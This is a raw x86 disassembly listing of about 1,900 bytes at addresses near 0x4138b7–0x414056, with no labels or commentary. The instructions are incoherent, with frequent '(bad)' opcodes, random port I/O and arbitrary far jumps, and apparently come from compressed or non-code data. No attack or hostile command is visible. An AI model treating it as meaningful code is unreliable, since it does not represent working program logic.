  4138b7:	test   BYTE PTR [edx+0x1b],bl
  4138ba:	fiadd  DWORD PTR [eax-0x2ac196c2]
  4138c0:	adc    eax,0x795b1693
  4138c5:	(bad)  
  4138c6:	mov    bh,0xa0
  4138c8:	push   0x628b3625
  4138cd:	xchg   DWORD PTR [ebx+ecx*4-0x49],ecx
  4138d1:	(bad)  
  4138d2:	jmp    0x5bfe71b2
  4138d7:	cs jb  0x4138ce
  4138da:	addr16 pop ecx
  4138dc:	xchg   BYTE PTR [edx],dh
  4138de:	add    DWORD PTR [ebp+0x77a878c2],0x26
  4138e5:	(bad)  
  4138e6:	jle    0x4138f0
  4138e8:	not    BYTE PTR [edi+0x2c]
  4138eb:	daa    
  4138ec:	hlt    
  4138ed:	(bad)  
  4138ee:	std    
  4138ef:	test   DWORD PTR [edx],ecx
  4138f1:	or     ch,BYTE PTR [edi-0x134c0f6]
  4138f7:	clc    
  4138f8:	test   eax,0x936647ff
  4138fd:	out    0xa2,al
  4138ff:	iret   
  413900:	mov    al,ds:0x31b4113e
  413905:	rcr    ecx,1
  413907:	loopne 0x413943
  413909:	dec    bp
  41390b:	out    0x19,al
  41390d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41390e:	popf   
  41390f:	test   al,al
  413911:	out    0xce,al
  413913:	(bad)  
  413914:	mov    ds:0x1fbeb3a8,eax
  413919:	jbe    0x41395e
  41391b:	(bad)  
  41391c:	rcr    DWORD PTR [edi-0x7c1a6041],cl
  413922:	pop    ebx
  413923:	or     al,0x15
  413925:	fsub   st(4),st
  413927:	dec    edx
  413928:	jbe    0x41397d
  41392a:	or     WORD PTR [ecx],0xd62d
  41392f:	imul   eax,DWORD PTR [eax],0x88c99ad3
  413935:	cdq    
  413936:	pop    ebx
  413937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413938:	add    DWORD PTR [esi-0x76b91237],esi
  41393e:	stc    
  41393f:	fstp   TBYTE PTR [edi]
  413941:	and    eax,0x478659a7
  413946:	fld    QWORD PTR [eax-0x7b545094]
  41394c:	pop    esi
  41394d:	rcl    BYTE PTR [edi+edx*4],1
  413950:	aas    
  413951:	or     eax,0x6bc9ced0
  413956:	jnp    0x41393a
  413958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413959:	out    0x54,eax
  41395b:	in     eax,dx
  41395c:	cs pop edx
  41395e:	xchg   ebx,eax
  41395f:	imul   edi,edi,0x313fdbb2
  413965:	out    0x67,eax
  413967:	mov    eax,0x65b7fcb
  41396c:	xor    al,0xe6
  41396e:	push   ds
  41396f:	call   DWORD PTR [eax]
  413971:	fiadd  WORD PTR [ebp+0x7fd33265]
  413977:	loope  0x41396c
  413979:	out    0x22,eax
  41397b:	mov    dl,0x3
  41397d:	jmp    0xe763c08b
  413982:	cs dec ebx
  413984:	lods   eax,DWORD PTR ds:[esi]
  413985:	test   BYTE PTR [esi],ah
  413987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413988:	das    
  413989:	cmp    ecx,esi
  41398b:	ds (bad) 
  41398d:	outs   dx,BYTE PTR ds:[esi]
  41398e:	pop    edx
  41398f:	out    dx,al
  413990:	pop    es
  413991:	sbb    DWORD PTR [ecx-0x43],0xffffffa6
  413995:	add    DWORD PTR [esp+eax*4],0x4f414266
  41399c:	add    BYTE PTR [ecx-0x5],bl
  41399f:	loope  0x413960
  4139a1:	jge    0x413957
  4139a3:	ret    0x8c15
  4139a6:	cwde   
  4139a7:	jo     0x41397b
  4139a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139aa:	retf   0xc8f8
  4139ad:	stc    
  4139ae:	pop    edx
  4139af:	data16 stc 
  4139b1:	gs clc 
  4139b3:	pusha  
  4139b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139b5:	inc    ecx
  4139b6:	pop    edx
  4139b7:	push   esi
  4139b8:	gs leave 
  4139ba:	and    edx,DWORD PTR [ecx-0x7be2ccb8]
  4139c0:	or     bh,BYTE PTR [eax-0x45]
  4139c3:	js     0x413a04
  4139c5:	ins    DWORD PTR es:[edi],dx
  4139c6:	loope  0x413a3d
  4139c8:	pop    esp
  4139c9:	cmp    eax,0xe696ca6a
  4139ce:	xchg   cl,dl
  4139d0:	pop    es
  4139d1:	neg    DWORD PTR [eax-0x47eb2637]
  4139d7:	pop    edi
  4139d8:	mov    ch,0x89
  4139da:	pop    esp
  4139db:	add    bh,dh
  4139dd:	out    0x25,al
  4139df:	or     ecx,DWORD PTR [ebx]
  4139e1:	es add al,0x65
  4139e4:	jno    0x413a4d
  4139e6:	scas   eax,DWORD PTR es:[edi]
  4139e7:	fldcw  WORD PTR [eax]
  4139e9:	xchg   DWORD PTR [ebx],edi
  4139eb:	or     al,0xcc
  4139ed:	out    0x6e,eax
  4139ef:	out    dx,al
  4139f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f1:	xchg   esi,eax
  4139f2:	(bad)
  4139f6:	push   ebx
  4139f7:	xchg   DWORD PTR [ebx],edi
  4139f9:	sub    ebp,esp
  4139fb:	int3   
  4139fc:	xchg   BYTE PTR [ebx],ah
  4139fe:	cmp    BYTE PTR [ebp+0x13],ah
  413a01:	ja     0x413a60
  413a03:	xor    al,0xfe
  413a05:	xchg   edi,eax
  413a06:	in     eax,dx
  413a07:	jge    0x413a79
  413a09:	out    0x96,eax
  413a0b:	cwde   
  413a0c:	sub    esi,edx
  413a0e:	pop    eax
  413a0f:	ss mov bl,0x11
  413a12:	xchg   ebx,eax
  413a13:	push   esp
  413a14:	rol    eax,0x65
  413a17:	outs   dx,BYTE PTR ds:[esi]
  413a18:	ds mov dl,0x5a
  413a1b:	pop    edi
  413a1c:	and    eax,ebp
  413a1e:	mov    esp,0x856d8c46
  413a23:	pushf  
  413a24:	xchg   edx,eax
  413a25:	hlt    
  413a26:	xchg   edi,eax
  413a27:	add    eax,0x9930c33e
  413a2c:	mov    edx,0x52590e9e
  413a31:	out    0xfe,eax
  413a33:	cmc    
  413a34:	mov    ds:0x3385636a,eax
  413a39:	mov    BYTE PTR [esi],bl
  413a3b:	mov    ds:0x2d1a6d61,al
  413a40:	ins    BYTE PTR es:[edi],dx
  413a41:	sbb    BYTE PTR [edx+0x2e],0xfc
  413a45:	push   esp
  413a46:	cld    
  413a47:	jmp    0x59e0223f
  413a4c:	les    edi,FWORD PTR [ebx+eiz*1-0x49]
  413a50:	jbe    0x413a96
  413a52:	add    DWORD PTR ds:0xae5a0d65,ecx
  413a58:	shr    DWORD PTR [esi*1+0x44d1f0ed],cl
  413a5f:	test   BYTE PTR [eax+0x62a09f98],ah
  413a65:	(bad)  
  413a66:	sub    al,0x6d
  413a68:	ds out dx,eax
  413a6a:	cmp    bh,BYTE PTR [edx-0x1c]
  413a6d:	rol    DWORD PTR [esi+esi*8],0x89
  413a71:	out    0x94,al
  413a73:	jl     0x413a6d
  413a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a76:	daa    
  413a77:	ss cdq 
  413a79:	push   ss
  413a7a:	adc    BYTE PTR [eax-0x64],bh
  413a7d:	add    bl,BYTE PTR [edx-0x42]
  413a80:	pop    ebx
  413a81:	test   DWORD PTR [ebp-0x19d6992c],ecx
  413a87:	test   eax,ebp
  413a89:	sub    bh,BYTE PTR [eax+ebp*1+0x3e]
  413a8d:	jecxz  0x413a6a
  413a8f:	mov    eax,0xa75d26d3
  413a94:	dec    edi
  413a95:	add    ch,BYTE PTR [eax]
  413a97:	xchg   edx,eax
  413a98:	mov    eax,0x3984c76b
  413a9d:	stos   DWORD PTR es:[edi],eax
  413a9e:	fwait
  413a9f:	inc    esi
  413aa0:	cmp    DWORD PTR [ebx-0x5db73e3],edx
  413aa6:	jns    0x413afb
  413aa8:	mov    ds:0x94256057,eax
  413aad:	and    dl,BYTE PTR [edx+0x2c298b84]
  413ab3:	jmp    0x413af4
  413ab5:	jmp    0x413aae
  413ab7:	ret    
  413ab8:	mov    bl,0x94
  413aba:	sbb    esp,edx
  413abc:	cmp    eax,0xfd49fce7
  413ac1:	mov    esp,0xd69b8bd3
  413ac6:	adc    DWORD PTR [ebx-0x6c594d1e],ebp
  413acc:	push   es
  413acd:	fnstenv [edx+ebp*1-0x3faf0ac1]
  413ad4:	std    
  413ad5:	(bad)  
  413ad6:	(bad)  
  413ad7:	clc    
  413ad8:	adc    BYTE PTR [esi-0x2ace7bc4],ah
  413ade:	jg     0x413aad
  413ae0:	push   es
  413ae1:	pop    ds
  413ae2:	mov    eax,ds:0x605cbf47
  413ae7:	push   esi
  413ae8:	and    edx,DWORD PTR [edx]
  413aea:	inc    ebx
  413aeb:	div    BYTE PTR [esi]
  413aed:	dec    ecx
  413aee:	mov    ebx,0x6cf1cd84
  413af3:	ss inc ebx
  413af5:	xor    eax,0xeb43b532
  413afa:	lds    eax,FWORD PTR [esp+ecx*4-0x55176223]
  413b01:	ja     0x413b61
  413b03:	test   edi,esi
  413b05:	cmp    eax,0xd3e9b8c
  413b0a:	ror    DWORD PTR [ebx-0x67],cl
  413b0d:	shl    esi,cl
  413b0f:	add    BYTE PTR [edi],dl
  413b11:	fsubr  st(6),st
  413b13:	sub    esp,DWORD PTR [ebp-0x1f365017]
  413b19:	out    0x8c,al
  413b1b:	pusha  
  413b1c:	sub    eax,DWORD PTR [ebp+0x65]
  413b1f:	dec    esi
  413b20:	sbb    al,dh
  413b22:	pop    ebp
  413b23:	(bad)  
  413b24:	lock cwde 
  413b26:	mov    ebp,0x3b236282
  413b2b:	adc    eax,0x547ae60b
  413b30:	adc    al,BYTE PTR [edi]
  413b32:	add    al,0xea
  413b34:	iret   
  413b35:	fadd   st,st(1)
  413b37:	jmp    0x2bb1:0x8ab553f
  413b3e:	add    BYTE PTR [ebx],ah
  413b40:	mov    bh,0xe0
  413b42:	mov    al,ds:0x50ea311d
  413b47:	fdivr  QWORD PTR [edi]
  413b49:	mov    WORD PTR [esi],?
  413b4b:	mov    ebx,0xef12ef3d
  413b50:	jmp    0xa631f633
  413b55:	mov    ds:0xe7d3470f,al
  413b5a:	ror    bl,cl
  413b5c:	daa    
  413b5d:	jb     0x413b14
  413b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b60:	or     DWORD PTR es:[edx],0x6f
  413b64:	jmp    0x8055965d
  413b69:	iret   
  413b6a:	and    edx,esp
  413b6c:	push   0x3f936396
  413b71:	in     al,0xc1
  413b73:	pop    edx
  413b74:	jecxz  0x413b23
  413b76:	xor    eax,0x5bee268e
  413b7b:	shl    BYTE PTR [eax],cl
  413b7d:	sub    al,0x19
  413b7f:	add    ebp,DWORD PTR [edx]
  413b81:	out    0xa4,al
  413b83:	imul   esp,esp,0x39
  413b86:	xchg   ecx,eax
  413b87:	and    al,0xdc
  413b89:	out    dx,al
  413b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8b:	add    al,0x3e
  413b8d:	jb     0x240b1f70
  413b93:	jb     0x413b8a
  413b95:	xchg   ebx,eax
  413b96:	lock add bh,BYTE PTR [edi]
  413b99:	call   FWORD PTR [eax-0x3c]
  413b9c:	push   0xfffffff2
  413b9e:	neg    BYTE PTR [esi]
  413ba0:	inc    esi
  413ba1:	pop    es
  413ba2:	(bad)  
  413ba3:	test   DWORD PTR [eax+0x5b872055],0xa6283528
  413bad:	out    0x9a,al
  413baf:	jo     0x413bb5
  413bb1:	push   ebx
  413bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bb3:	xchg   ebp,eax
  413bb4:	test   al,0xed
  413bb6:	pop    ecx
  413bb7:	pop    es
  413bb8:	mov    edx,0x604e5b00
  413bbd:	jl     0x413c1c
  413bbf:	cld    
  413bc0:	pop    edx
  413bc1:	mov    eax,DWORD PTR [esp+eax*4]
  413bc4:	es (bad) 
  413bc6:	call   0x322b:0x1ff0fb04
  413bcd:	fsub   QWORD PTR [eax+0x54]
  413bd0:	mov    ds:0x223b5a90,al
  413bd5:	out    0xb4,al
  413bd7:	push   0x699b8085
  413bdc:	out    dx,al
  413bdd:	adc    ebx,ecx
  413bdf:	fdiv   QWORD PTR [edi+0x2b]
  413be2:	pop    edx
  413be3:	add    al,0x12
  413be5:	mov    bl,0x42
  413be7:	push   edx
  413be8:	(bad)  
  413be9:	ja     0x413c32
  413beb:	test   BYTE PTR [ecx+0x3fbf4c7c],bh
  413bf1:	jmp    0x413b84
  413bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bf4:	jmp    0x413c03
  413bf6:	sub    cl,dl
  413bf8:	pushf  
  413bf9:	out    dx,eax
  413bfa:	mov    esi,0x3f17eed1
  413bff:	pop    edx
  413c00:	aas    
  413c01:	adc    al,BYTE PTR [edi-0x7b183e86]
  413c07:	jae    0x413bfe
  413c09:	sahf   
  413c0a:	or     edx,DWORD PTR [edi]
  413c0c:	mov    edi,0x34ff3fe6
  413c11:	leave  
  413c12:	pop    ebx
  413c13:	sub    BYTE PTR [edx],dh
  413c15:	jns    0x413c7b
  413c17:	ss sahf 
  413c19:	jle    0x413c93
  413c1b:	sti    
  413c1c:	inc    ecx
  413c1d:	mov    edi,0xd266165a
  413c22:	push   cs
  413c23:	loopne 0x413c21
  413c25:	adc    al,0x58
  413c27:	aam    0xbb
  413c29:	stos   BYTE PTR es:[edi],al
  413c2a:	fiadd  DWORD PTR [eax-0x621d185e]
  413c30:	das    
  413c31:	add    ch,BYTE PTR ds:0x76d2d6be
  413c37:	dec    DWORD PTR [edi-0x23]
  413c3a:	pop    edx
  413c3b:	or     ah,BYTE PTR [ecx+eiz*8+0x15]
  413c3f:	mov    BYTE PTR [esi],0x4e
  413c42:	add    al,BYTE PTR [ecx+ecx*2+0x3eb826fb]
  413c49:	inc    edi
  413c4a:	mov    edi,0xb651f7f6
  413c4f:	jae    0x413c9f
  413c51:	leave  
  413c52:	and    BYTE PTR [ebx-0x2c5d0598],dh
  413c58:	jg     0x413c98
  413c5a:	mov    ecx,0x2104cbfd
  413c5f:	cmp    BYTE PTR [ebx+edi*1+0x51],cl
  413c63:	ins    BYTE PTR es:[edi],dx
  413c64:	mov    edi,0xe98e2dd2
  413c69:	cmc    
  413c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c6b:	sbb    BYTE PTR [eax],al
  413c6d:	or     eax,DWORD PTR [ecx+0x5bfdfa90]
  413c73:	ds inc esp
  413c75:	inc    edi
  413c76:	scas   al,BYTE PTR es:[edi]
  413c77:	idiv   BYTE PTR [edx+0x12]
  413c7a:	xchg   ecx,eax
  413c7b:	test   bl,bl
  413c7d:	ret    0xf166
  413c80:	enter  0x2a73,0x85
  413c84:	(bad)  
  413c85:	shl    DWORD PTR [edx],1
  413c87:	nop
  413c88:	aas    
  413c89:	add    DWORD PTR [edi-0x78335056],esi
  413c8f:	xchg   al,al
  413c91:	out    0xa0,al
  413c93:	jmp    0xb2f3:0x28200f15
  413c9a:	popf   
  413c9b:	loope  0x413d1b
  413c9d:	cmp    BYTE PTR [edx],ch
  413c9f:	in     eax,0x3e
  413ca1:	stos   DWORD PTR es:[edi],eax
  413ca2:	jl     0x413c89
  413ca4:	sub    bh,BYTE PTR [ecx]
  413ca6:	les    ebp,FWORD PTR gs:[ecx-0x4af43d20]
  413cad:	inc    ebx
  413cae:	cdq    
  413caf:	hlt    
  413cb0:	fild   WORD PTR [esi+esi*8+0x6d]
  413cb4:	ds leave 
  413cb6:	push   0x55
  413cb8:	aam    0x3b
  413cba:	mov    cl,0x9b
  413cbc:	mov    eax,0x27744ae6
  413cc1:	rcl    DWORD PTR [edi+0x2f],0xb6
  413cc5:	xchg   edx,eax
  413cc6:	mov    ch,0xda
  413cc8:	pop    esp
  413cc9:	stc    
  413cca:	pop    edi
  413ccb:	pusha  
  413ccc:	ja     0x413cf2
  413cce:	dec    ecx
  413ccf:	enter  0x82de,0xcb
  413cd3:	inc    eax
  413cd4:	test   BYTE PTR [eax],bl
  413cd6:	sub    al,BYTE PTR [ebp+0x5cf6207d]
  413cdc:	ret    0x8375
  413cdf:	test   al,0xe2
  413ce1:	add    al,0x45
  413ce3:	les    eax,FWORD PTR [edi+0x6d85d1f8]
  413ce9:	out    0xe,eax
  413ceb:	nop
  413cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ced:	outs   dx,BYTE PTR ds:[esi]
  413cee:	clc    
  413cef:	xor    bl,BYTE PTR [esp+edi*4]
  413cf2:	popf   
  413cf3:	bnd jbe 0x413d2b
  413cf6:	pop    edx
  413cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf8:	jp     0x413d22
  413cfa:	test   eax,0xe8fb7258
  413cff:	add    BYTE PTR [esi+0xd1a537c],0xc9
  413d06:	fisttp DWORD PTR [edx-0x2ba42cf1]
  413d0c:	call   0x34facc75
  413d11:	push   es
  413d12:	xor    DWORD PTR [ebp+0x37c9d794],eax
  413d18:	aas    
  413d19:	xchg   ecx,eax
  413d1a:	add    DWORD PTR [ecx-0x69adce83],eax
  413d20:	jmp    esi
  413d22:	adc    al,0x48
  413d24:	ins    BYTE PTR es:[edi],dx
  413d25:	mov    eax,0xeb3b2407
  413d2a:	xor    al,0x8f
  413d2c:	jb     0x413d47
  413d2e:	pop    esp
  413d2f:	inc    edx
  413d30:	or     esi,eax
  413d32:	sbb    eax,0xecf1cb78
  413d37:	add    DWORD PTR [ecx],0x5919b434
  413d3d:	rcr    BYTE PTR [edx+0x56],0x3f
  413d41:	fild   DWORD PTR [eax-0x1b]
  413d44:	pop    es
  413d45:	mov    ch,0xf3
  413d47:	sar    BYTE PTR [esi+0x761312e7],1
  413d4d:	mov    ebx,0x8d39a8d2
  413d52:	out    dx,al
  413d53:	dec    esp
  413d54:	xchg   esp,esp
  413d56:	and    al,0x5a
  413d58:	pop    es
  413d59:	inc    esi
  413d5a:	add    bl,BYTE PTR [esi+eiz*8-0x40]
  413d5e:	cs ds push 0xffffff88
  413d62:	fadd   DWORD PTR [edi+esi*8+0x46cae36e]
  413d69:	std    
  413d6a:	inc    eax
  413d6b:	out    dx,eax
  413d6c:	cmp    DWORD PTR [ebx+eiz*8-0x3fd51b7b],ebp
  413d73:	fcom   QWORD PTR es:[edx-0x44]
  413d77:	xor    al,0xbb
  413d7a:	and    al,0x77
  413d7c:	(bad)  
  413d7d:	das    
  413d7e:	mov    DWORD PTR ds:0x4155373f,esp
  413d84:	adc    bl,BYTE PTR [esp+eax*2]
  413d87:	sub    BYTE PTR [edx-0x19],bl
  413d8a:	push   edx
  413d8b:	or     DWORD PTR [ecx+edi*1+0x1c],0x3c
  413d90:	(bad)  
  413d91:	(bad)  
  413d92:	cmc    
  413d93:	mov    WORD PTR [edx+esi*8],fs
  413d96:	push   ebp
  413d97:	(bad)  
  413d98:	pop    ds
  413d99:	lods   eax,DWORD PTR ds:[esi]
  413d9a:	jnp    0x413daa
  413d9c:	jp     0x413df4
  413d9e:	ror    BYTE PTR [eax],cl
  413da0:	xor    al,0x13
  413da2:	sbb    BYTE PTR [edx+edi*1+0x66],bh
  413da6:	fyl2xp1 
  413da8:	addr16 adc eax,0x1e1e9bc7
  413dae:	pop    edx
  413daf:	pusha  
  413db0:	hlt    
  413db1:	loopne 0x413d53
  413db3:	shr    DWORD PTR [eax-0x2a],cl
  413db6:	xchg   edi,eax
  413db7:	test   BYTE PTR [ebx+0x2e],dl
  413dba:	fisttp WORD PTR [edi+0x4bdac53f]
  413dc0:	pop    ss
  413dc1:	inc    ebx
  413dc2:	add    bh,bh
  413dc4:	inc    esi
  413dc5:	out    0x7a,al
  413dc7:	sbb    al,0x6e
  413dc9:	jno    0x413d80
  413dcb:	sbb    ah,BYTE PTR [ecx+0x1e]
  413dce:	push   esp
  413dcf:	pop    ebp
  413dd0:	(bad)  
  413dd1:	xchg   esp,eax
  413dd2:	pop    edx
  413dd3:	(bad)  
  413dd4:	add    eax,esi
  413dd6:	sbb    eax,0x6e05482d
  413ddb:	cmp    DWORD PTR [edx-0x5aee199e],0xffffffc8
  413de2:	jp     0x413def
  413de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413de5:	scas   al,BYTE PTR es:[edi]
  413de6:	jle    0x413e2c
  413de8:	sbb    BYTE PTR [edx+0x5c],cl
  413deb:	sbb    BYTE PTR [ebp-0x4afb45e1],ch
  413df1:	or     esp,ebx
  413df3:	pop    ecx
  413df4:	loop   0x413e51
  413df6:	test   ch,bl
  413df8:	sub    al,0x22
  413dfb:	test   BYTE PTR [eax],cl
  413dfd:	dec    esi
  413dfe:	je     0x413e49
  413e00:	mov    ebp,0x731e26e6
  413e05:	push   ss
  413e06:	jle    0x413df3
  413e08:	hlt    
  413e09:	loop   0x413e81
  413e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e0c:	pusha  
  413e0d:	jmp    0x920c:0x27d173d0
  413e14:	aaa    
  413e15:	out    0x1c,eax
  413e17:	or     eax,0x4d3bf411
  413e1c:	bswap  esi
  413e1e:	cmovle eax,DWORD PTR [ebx-0x42711d1a]
  413e25:	mov    al,0x64
  413e27:	retf   0xe6da
  413e2a:	push   edx
  413e2b:	mov    bl,0xb5
  413e2d:	mov    ds:0x2f4b5f2d,eax
  413e32:	test   DWORD PTR [ebx-0x6fa489bc],ebp
  413e38:	pop    edx
  413e39:	(bad)  
  413e3a:	pop    ss
  413e3b:	stos   DWORD PTR es:[edi],eax
  413e3c:	ret    0x9568
  413e3f:	test   DWORD PTR [ebx-0x51],ebp
  413e42:	clc    
  413e43:	inc    edi
  413e44:	dec    ebp
  413e45:	jg     0x413e25
  413e47:	inc    eax
  413e48:	leave  
  413e49:	adc    bl,ah
  413e4b:	test   BYTE PTR [ebx],bh
  413e4d:	in     eax,0xc9
  413e4f:	add    ebx,DWORD PTR [esi]
  413e51:	fwait
  413e52:	test   DWORD PTR ss:[edi+ebp*1+0x1920c59a],esi
  413e5a:	pop    ebp
  413e5b:	push   ss
  413e5c:	data16 fs mov al,0xae
  413e60:	std    
  413e61:	shrd   DWORD PTR [esp+esi*8+0x72dba2e7],ecx,0x1
  413e6a:	cmp    al,0x6b
  413e6c:	xchg   ecx,eax
  413e6d:	movq   QWORD PTR [ecx-0x7d5fb2fc],mm1
  413e74:	mov    edi,0x7a548653
  413e79:	adc    ecx,DWORD PTR [ebp-0x5c]
  413e7c:	adc    bl,ah
  413e7e:	mov    DWORD PTR [ecx+0x4312242e],eax
  413e84:	addr16 mov ah,0xb0
  413e87:	test   BYTE PTR [edi],ch
  413e89:	out    0x46,eax
  413e8b:	jae    0x413e79
  413e8d:	cmp    DWORD PTR [ecx-0x211e24d0],esi
  413e93:	cmp    DWORD PTR [edi-0x21],esp
  413e96:	jle    0x413e72
  413e98:	mov    cl,0xed
  413e9a:	pop    edx
  413e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e9c:	cmp    ebx,ebx
  413e9e:	and    al,0x35
  413ea0:	pop    esp
  413ea1:	push   0x780e475
  413ea6:	sub    esi,DWORD PTR [ecx]
  413ea8:	sub    DWORD PTR [esi],eax
  413eaa:	cmp    al,0x6a
  413eac:	repnz sbb eax,DWORD PTR [edx+eiz*4-0x45]
  413eb1:	jno    0x413eda
  413eb3:	(bad)  
  413eb4:	call   0x74c83d9f
  413eb9:	fnstenv [edx]
  413ebb:	hlt    
  413ebc:	in     al,0x7e
  413ebe:	mov    ebp,0xa1f73e17
  413ec3:	(bad)  
  413ec4:	adc    ecx,edi
  413ec6:	pushf  
  413ec7:	cmc    
  413ec8:	pop    ss
  413ec9:	out    0x70,al
  413ecb:	mov    esi,0xe07bcc5e
  413ed0:	mov    ebx,0x3eb3fdb9
  413ed5:	pop    es
  413ed6:	call   0x6561:0x2460decf
  413edd:	out    0x98,eax
  413edf:	jnp    0x413e99
  413ee1:	aam    0x44
  413ee3:	mov    ebp,0x2ff2545c
  413ee8:	mov    dh,0xd8
  413eea:	pop    ebx
  413eeb:	push   esi
  413eec:	xchg   esp,eax
  413eed:	xchg   esi,eax
  413eee:	ret    
  413eef:	std    
  413ef0:	cld    
  413ef1:	popf   
  413ef2:	add    eax,0xd3cf2f84
  413ef7:	and    al,0x8e
  413ef9:	call   FWORD PTR [ebx]
  413efb:	jmp    0xe229:0x840d4928
  413f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f03:	cmp    ebx,DWORD PTR [edx]
  413f05:	fidiv  DWORD PTR [ebp+0x5d243f84]
  413f0b:	pop    edx
  413f0c:	scas   eax,DWORD PTR es:[edi]
  413f0d:	jnp    0x413f4f
  413f0f:	jl     0x413f4b
  413f11:	repnz push edi
  413f13:	xchg   BYTE PTR [esi+0x14],dl
  413f16:	lea    eax,ds:[edi+eiz*8]
  413f1a:	mov    ds:0x17ba991d,al
  413f1f:	mov    ebx,0x953c2b62
  413f24:	jb     0x413f0d
  413f26:	jmp    0xdf63:0xdfe39a10
  413f2d:	sti    
  413f2e:	push   eax
  413f2f:	iret   
  413f30:	xor    DWORD PTR [eax+ecx*4+0x74],ebx
  413f34:	mov    bh,0x99
  413f36:	call   0x3e81:0x6f891aab
  413f3d:	out    0xc9,eax
  413f3f:	add    BYTE PTR [edx-0x355694a8],cl
  413f45:	mov    ch,0x3b
  413f47:	mov    ebp,DWORD PTR [ecx-0x3a]
  413f4a:	cld    
  413f4b:	cld    
  413f4c:	in     eax,0x7
  413f4e:	inc    eax
  413f4f:	fdivr  QWORD PTR [ecx+eax*4+0x2793de5c]
  413f56:	mov    bl,0xf1
  413f58:	test   esp,esp
  413f5a:	sahf   
  413f5b:	xchg   ebp,eax
  413f5c:	enter  0x920d,0x1
  413f60:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413f62:	inc    eax
  413f63:	(bad)  
  413f64:	sbb    bl,dh
  413f66:	cdq    
  413f67:	adc    BYTE PTR ds:0x85c5809d,bh
  413f6d:	add    al,0xa2
  413f6f:	pop    ecx
  413f70:	ret    
  413f71:	dec    ebp
  413f72:	sub    al,0xc4
  413f74:	addr16 inc ebx
  413f76:	pop    esp
  413f77:	and    al,0x76
  413f79:	xlat   BYTE PTR ds:[ebx]
  413f7a:	pop    ds
  413f7b:	gs jb  0x413f64
  413f7e:	or     al,BYTE PTR [esi-0x2b1f98c5]
  413f84:	out    dx,al
  413f85:	cmp    eax,0x1a262f6d
  413f8a:	pop    ebx
  413f8b:	jo     0x413f8d
  413f8d:	jns    0x414008
  413f8f:	mov    dl,0x98
  413f91:	test   DWORD PTR [esi],edi
  413f93:	test   DWORD PTR [ebp+0x3f07fc05],ebx
  413f99:	in     eax,dx
  413f9a:	mov    ebp,DWORD PTR [ebx]
  413f9c:	mov    ecx,DWORD PTR [eax-0x19c19c63]
  413fa2:	dec    edx
  413fa3:	xchg   DWORD PTR [ebp-0x2b66e5d7],ebp
  413fa9:	jge    0x413f42
  413fab:	lock mov esi,0x91245a87
  413fb1:	das    
  413fb2:	ret    
  413fb3:	(bad)  
  413fb4:	mov    ds:0xd91d54db,al
  413fb9:	cld    
  413fba:	pop    ebx
  413fbb:	push   edx
  413fbc:	in     al,dx
  413fbd:	cmp    dl,BYTE PTR [ebx]
  413fbf:	xchg   esp,eax
  413fc0:	cli    
  413fc1:	sbb    al,0x5a
  413fc3:	push   cs
  413fc4:	xchg   edx,eax
  413fc5:	inc    edi
  413fc6:	add    DWORD PTR [esi+ebx*4],ecx
  413fc9:	adc    DWORD PTR [ecx-0x499afe7d],0xffffffce
  413fd0:	adc    BYTE PTR [esi+0x209bf1fa],dh
  413fd6:	pop    ebx
  413fd7:	outs   dx,BYTE PTR ds:[esi]
  413fd8:	xchg   edx,eax
  413fd9:	inc    ebx
  413fda:	and    BYTE PTR [edx-0x7b4495c2],ch
  413fe0:	stos   BYTE PTR es:[edi],al
  413fe1:	fdivr  DWORD PTR [edx-0x79]
  413fe4:	and    BYTE PTR [edi-0x27],bh
  413fe7:	xchg   edi,eax
  413fe8:	into   
  413fe9:	out    0x91,eax
  413feb:	cld    
  413fec:	push   cs
  413fed:	push   ecx
  413fee:	jle    0x41401a
  413ff0:	pusha  
  413ff1:	inc    ecx
  413ff2:	sbb    al,0x84
  413ff4:	(bad)  
  413ff5:	inc    ecx
  413ff6:	fidivr WORD PTR [bx]
  413ff9:	push   edi
  413ffa:	push   eax
  413ffb:	es stos BYTE PTR es:[edi],al
  413ffd:	sbb    al,0x61
  413fff:	push   es
  414000:	push   cs
  414001:	popf   
  414002:	fisubr WORD PTR [edx-0x20cb4c4]
  414008:	adc    dl,bh
  41400a:	cmp    eax,0xb136af98
  41400f:	or     edi,DWORD PTR [edi]
  414011:	xor    ecx,DWORD PTR [esi+edi*8+0x62]
  414015:	das    
  414016:	push   ebp
  414017:	sti    
  414018:	adc    edi,ecx
  41401a:	jmp    0x1717:0x79abca14
  414021:	sbb    ebx,ebx
  414023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414024:	sub    ebx,ebx
  414026:	in     eax,0x3f
  414028:	jo     0x414010
  41402a:	fcmovnu st,st(0)
  41402c:	jne    0x41407d
  41402e:	xchg   esp,eax
  41402f:	imul   ebx,DWORD PTR [edx+edx*1-0x9],0xffffff8d
  414034:	or     BYTE PTR [esi+0x37],ah
  414037:	pusha  
  414038:	xor    eax,0x8e91ce45
  41403d:	or     eax,0x62bf7a55
  414042:	test   al,0x4f
  414044:	and    esp,esi
  414046:	mov    al,ds:0x92dac272
  41404b:	jecxz  0x41409b
  41404d:	adc    al,0xf2
  41404f:	stos   DWORD PTR es:[edi],eax
  414050:	mov    ebp,0xbc0254c6
  414055:	dec    ebp
  414056:	cmp    esp,DWORD PTR [ecx-0x21]
